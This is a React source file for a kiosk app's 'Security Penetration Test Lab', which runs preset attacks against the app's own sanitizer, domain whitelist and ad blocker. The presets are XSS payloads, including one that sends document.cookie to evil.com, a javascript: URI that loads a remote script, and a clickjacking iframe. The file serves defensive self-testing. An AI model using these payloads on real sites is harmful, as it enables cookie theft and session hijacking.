import React, { useState } from 'react';
import { X, Play, ShieldAlert, CheckCircle2, AlertTriangle, Bug, Code2, Lock } from 'lucide-react';
import { KioskConfig, SecurityEvent } from '../types';
import { sanitizeHtml, isUrlAllowed, isAdOrTracker, createSecurityEvent } from '../utils/security';

interface SecurityTestLabProps {
  config: KioskConfig;
  isOpen: boolean;
  onClose: () => void;
  onSecurityEvent: (event: SecurityEvent) => void;
}

export const SecurityTestLab: React.FC<SecurityTestLabProps> = ({
  config,
  isOpen,
  onClose,
  onSecurityEvent,
}) => {
  const [selectedAttack, setSelectedAttack] = useState<string>('xss-script');
  const [customPayload, setCustomPayload] = useState<string>('<script>alert("XSS Attack")</script><img src=x onerror="fetch(\'http://evil.com/cookie=\'+document.cookie)">');
  const [testResult, setTestResult] = useState<{
    status: 'passed' | 'blocked' | 'warning';
    title: string;
    details: string;
    sanitizedOutput?: string;
    flaggedThreats?: string[];
  } | null>(null);

  if (!isOpen) return null;

  const ATTACK_PRESETS = [
    {
      id: 'xss-script',
      title: 'HTML & Script Tag Injection',
      desc: 'Injecting dynamic <script> tag and inline event handlers (onerror/onload).',
      payload: `<div class="content">\n  <h2>Welcome Customer</h2>\n  <script>window.location="http://evil-attacker.com/steal";</script>\n  <img src="invalid-image.jpg" onerror="alert('Malicious XSS executed!')" />\n</div>`,
      type: 'injection',
    },
    {
      id: 'javascript-pseudo',
      title: 'javascript: URI Scheme Exploit',
      desc: 'Injecting execution strings via href or iframe src.',
      payload: `javascript:void((function(){var el=document.createElement('script');el.src='https://malware.com/payload.js';document.body.appendChild(el);})())`,
      type: 'scheme',
    },
    {
      id: 'whitelist-bypass',
      title: 'External Phishing Domain Bypass',
      desc: 'Attempting to navigate to an unauthorized competitor/phishing portal.',
      payload: `https://phishing-portal-fake.com/auth/login?victim=true`,
      type: 'whitelist',
    },
    {
      id: 'ad-tracker',
      title: 'Ad Network & Telemetry Beacon',
      desc: 'Attempting to fire tracking pixels and ad network banners.',
      payload: `https://pagead2.googlesyndication.com/pagead/ads?client=ca-pub-123456&ad_type=banner`,
      type: 'ad',
    },
    {
      id: 'iframe-overlay',
      title: 'Malicious Clickjacking <iframe>',
      desc: 'Injecting unapproved hidden nested iframe container.',
      payload: `<iframe src="https://attacker.site/overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.9;z-index:99999;"></iframe>`,
      type: 'injection',
    },
  ];

  const handleSelectPreset = (presetId: string) => {
    setSelectedAttack(presetId);
    const found = ATTACK_PRESETS.find((p) => p.id === presetId);
    if (found) {
      setCustomPayload(found.payload);
      setTestResult(null);
    }
  };

  const handleRunSecurityTest = () => {
    const activePreset = ATTACK_PRESETS.find((p) => p.id === selectedAttack);
    const attackType = activePreset?.type || 'injection';

    if (attackType === 'whitelist') {
      const check = isUrlAllowed(customPayload, config.security.allowedDomains);
      if (!check.allowed) {
        onSecurityEvent(
          createSecurityEvent(
            'whitelist_violation',
            `Security Test: Whitelist engine successfully intercepted outside URL.`,
            customPayload,
            undefined,
            'medium'
          )
        );
        setTestResult({
          status: 'blocked',
          title: 'Attack Neutralized: Whitelist Guard Blocked Navigation',
          details: `The browser security filter recognized that "${customPayload}" is not in the approved whitelist [${config.security.allowedDomains.join(', ')}]. Access was denied immediately.`,
        });
      } else {
        setTestResult({
          status: 'warning',
          title: 'URL Permitted by Policy',
          details: `The domain in this payload matches your current whitelist rules.`,
        });
      }
      return;
    }

    if (attackType === 'ad') {
      const adCheck = isAdOrTracker(customPayload);
      if (adCheck.isAd) {
        onSecurityEvent(
          createSecurityEvent(
            'ad_blocked',
            `Security Test: Blocked ad network request matching pattern "${adCheck.matchedPattern}"`,
            customPayload,
            undefined,
            'low'
          )
        );
        setTestResult({
          status: 'blocked',
          title: 'Ad & Tracker Blocked',
          details: `Matched AdBlock filter pattern: "${adCheck.matchedPattern}". Request is completely dropped with zero network bandwidth leaked.`,
        });
      } else {
        setTestResult({
          status: 'passed',
          title: 'No Known Ad Signature',
          details: 'The request did not trigger ad blocklist heuristics.',
        });
      }
      return;
    }

    if (attackType === 'scheme') {
      const check = isUrlAllowed(customPayload, config.security.allowedDomains);
      onSecurityEvent(
        createSecurityEvent(
          'unsafe_protocol_blocked',
          `Security Test: Neutralized unsafe javascript: pseudoprotocol exploit.`,
          customPayload,
          customPayload,
          'high'
        )
      );
      setTestResult({
        status: 'blocked',
        title: 'Exploit Neutralized: Unsafe Protocol Blocked',
        details: check.reason || 'Blocked javascript: execution string.',
      });
      return;
    }

    // Default: HTML Injection & XSS Sanitization
    const sanitization = sanitizeHtml(customPayload);
    if (sanitization.injectionDetected) {
      onSecurityEvent(
        createSecurityEvent(
          'injection_blocked',
          `Security Test: Stripped ${sanitization.flaggedPayloads.length} dangerous injection payloads: ${sanitization.flaggedPayloads.join(', ')}`,
          undefined,
          customPayload,
          'high'
        )
      );
      setTestResult({
        status: 'blocked',
        title: 'HTML Injection Neutralized: Anti-XSS Engine Passed',
        details: `Successfully detected and stripped ${sanitization.flaggedPayloads.length} unauthorized script/DOM execution threats.`,
        sanitizedOutput: sanitization.cleanHtml,
        flaggedThreats: sanitization.flaggedPayloads,
      });
    } else {
      setTestResult({
        status: 'passed',
        title: 'Payload Safe (No Malicious Tags Detected)',
        details: 'The payload contains standard safe text or sanitized HTML markup.',
        sanitizedOutput: sanitization.cleanHtml,
      });
    }
  };

  return (
    <div
      id="security-test-lab-modal"
      className="fixed inset-0 z-50 bg-slate-900/40 backdrop-blur-xs flex items-center justify-center p-4"
    >
      <div className="bg-white border border-slate-200 rounded-2xl w-full max-w-3xl max-h-[90vh] shadow-xl flex flex-col text-slate-900 overflow-hidden animate-in fade-in zoom-in-95 duration-200">
        {/* Header */}
        <div className="h-14 bg-white border-b border-slate-200 px-5 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-amber-50 border border-amber-200 flex items-center justify-center text-amber-600">
              <Bug className="w-4 h-4" />
            </div>
            <div>
              <h3 className="font-bold text-sm text-slate-900">Security Penetration Test Lab</h3>
              <span className="text-[11px] text-slate-500">Verify Hidden URL, No-Ads, & Anti-Injection Guards</span>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-lg cursor-pointer transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Content */}
        <div className="flex-1 overflow-y-auto p-5 space-y-4 bg-slate-50">
          {/* Attack Scenarios Selector */}
          <div>
            <label className="text-xs font-bold text-slate-800 block mb-2">
              Select Attack Vector to Simulate:
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {ATTACK_PRESETS.map((item) => (
                <button
                  key={item.id}
                  type="button"
                  onClick={() => handleSelectPreset(item.id)}
                  className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                    selectedAttack === item.id
                      ? 'bg-amber-50/80 border-amber-300 text-amber-950 ring-1 ring-amber-300 shadow-xs'
                      : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-100'
                  }`}
                >
                  <span className="text-xs font-bold block">{item.title}</span>
                  <span className="text-[11px] text-slate-500 leading-snug line-clamp-2 mt-0.5">{item.desc}</span>
                </button>
              ))}
            </div>
          </div>

          {/* Test Payload Input */}
          <div className="bg-white p-4 rounded-xl border border-slate-200 space-y-2 shadow-xs">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-slate-700 flex items-center gap-1.5">
                <Code2 className="w-3.5 h-3.5 text-indigo-600" />
                Raw Attack Payload
              </label>
              <span className="text-[10px] text-slate-400 font-mono font-medium">Editable test payload</span>
            </div>
            <textarea
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              rows={4}
              className="w-full bg-slate-50 border border-slate-200 focus:border-amber-500 focus:bg-white rounded-lg p-3 text-xs text-slate-900 font-mono outline-none resize-none"
            />
          </div>

          {/* Run Button */}
          <button
            id="btn-run-simulation"
            onClick={handleRunSecurityTest}
            className="w-full py-2.5 bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold rounded-xl text-xs shadow-xs flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-[0.99]"
          >
            <Play className="w-4 h-4 fill-slate-950" />
            Execute Security Probe Against Kiosk Sandbox
          </button>

          {/* Test Results Output */}
          {testResult && (
            <div
              className={`p-4 rounded-xl border animate-in fade-in duration-200 ${
                testResult.status === 'blocked'
                  ? 'bg-emerald-50 border-emerald-300 text-emerald-900'
                  : testResult.status === 'warning'
                  ? 'bg-amber-50 border-amber-300 text-amber-900'
                  : 'bg-white border-slate-200 text-slate-700'
              }`}
            >
              <div className="flex items-center gap-2.5 mb-2">
                {testResult.status === 'blocked' ? (
                  <CheckCircle2 className="w-5 h-5 text-emerald-600" />
                ) : (
                  <AlertTriangle className="w-5 h-5 text-amber-600" />
                )}
                <h4 className="text-xs font-bold">{testResult.title}</h4>
              </div>
              <p className="text-xs leading-relaxed mb-3 opacity-90">{testResult.details}</p>

              {testResult.flaggedThreats && testResult.flaggedThreats.length > 0 && (
                <div className="mb-3 space-y-1">
                  <span className="text-[11px] font-bold block text-slate-700 uppercase tracking-wider">
                    Threats Intercepted:
                  </span>
                  <div className="flex flex-wrap gap-1.5">
                    {testResult.flaggedThreats.map((threat, idx) => (
                      <span
                        key={idx}
                        className="text-[10px] bg-rose-50 text-rose-700 border border-rose-200 px-2 py-0.5 rounded font-mono font-medium"
                      >
                        ⚠️ {threat}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {testResult.sanitizedOutput !== undefined && (
                <div className="bg-white p-3 rounded-lg border border-slate-200 shadow-xs">
                  <span className="text-[10px] uppercase tracking-wider font-bold text-slate-500 block mb-1">
                    Sanitized Output (Safe DOM Execution):
                  </span>
                  <pre className="text-[11px] font-mono text-slate-800 whitespace-pre-wrap break-all">
                    {testResult.sanitizedOutput}
                  </pre>
                </div>
              )}
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="h-14 bg-white border-t border-slate-200 px-5 flex items-center justify-between">
          <span className="text-xs text-slate-600">
            Current Target Whitelist: <strong className="text-emerald-700 font-semibold font-mono">[{config.security.allowedDomains.join(', ')}]</strong>
          </span>
          <button
            onClick={onClose}
            className="px-4 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-semibold rounded-lg cursor-pointer transition-colors"
          >
            Close Lab
          </button>
        </div>
      </div>
    </div>
  );
};
